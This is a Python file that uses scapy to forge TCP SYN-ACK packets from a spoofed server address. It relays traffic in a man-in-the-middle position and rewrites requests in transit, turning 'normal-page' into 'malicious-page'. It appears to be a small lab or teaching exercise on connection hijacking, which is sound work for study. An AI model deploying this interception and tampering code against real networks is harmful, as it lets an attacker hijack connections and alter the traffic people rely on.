from scapy.all import Ether, IP, TCP, sendp
import socket, sys, logging


def handle_syn_ack(dst_mac, src_mac, ip_info, transport_info, interface, ip_dist, logger=None):
  client_ip = ip_info['Source IP']
  client_mac = dst_mac
  client_port = transport_info['Source Port']
  client_seq = transport_info["Sequence Number"]
  my_mac =  src_mac
  server_port = transport_info["Destination Port"]
  server_ip = ip_info['Destination IP']
  
  logger.info(f"Caught SYN from {client_ip}")
  my_isn = 1000
  
  ether = Ether(dst=client_mac, src=my_mac)
  ip = IP(dst=client_ip, src=server_ip)

  tcp = TCP(
    sport=server_port,
    dport=client_port,
    flags="SA",
    seq=my_isn,
    ack=client_seq + 1,
    window=64240
  )

  syn_ack_packet = ether / ip / tcp
  suniffer_socket = sendp(syn_ack_packet, iface=interface, verbose=False)
  ip_dist[client_ip]['socket'] = suniffer_socket
  logger.info(f"[+] Sent SYN-ACK to {client_ip}")
  logger.info(f"[+] Connection to {client_ip} established")

  return ip_dist

def connect_to_server(server_ip, server_port, ip_dist, logger):
  server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  
  try:
    server_sock.connect((server_ip, server_port))
    ip_dist[server_ip]['socket'] = server_sock
    logger.info(f"[+] Connection to {server_ip} established")
    return ip_dist
  
  except socket.error as e:
    print(f"[-] Failed to connect server: {e}")
    sys.exit(1)

def handle_transfer_packet(
  interface, logger, dst_ip, dst_mac, socket, payload, is_client=False, src_port=None, ip=None
):
  
  if is_client:
    ether = Ether(dst=dst_mac)
    ip_packet = IP(dst=dst_ip, src=ip)
    tcp = TCP(sport=src_port, dport=54321, flags="PA")
    packet = ether / ip_packet / tcp / payload
    sendp(packet, iface=interface, verbose=False)
    logger.info(f"[+] Forwarding response to {dst_ip}")

  else:
    if socket is not None and len(payload) > 0:
      if b'normal-page' in payload:
        modified_payload = payload.replace(b"normal", b"malicious")
        logger.info(f"[+] Payload modified: GET /normal-page -> GET /malicious-page")
      else:
        modified_payload = payload

      socket.sendall(modified_payload)
      logger.info(f"[+] Forwarding request to {dst_ip}")
    else:
      logger.warning(f"[-] Cannot send to server: socket is None or payload is empty")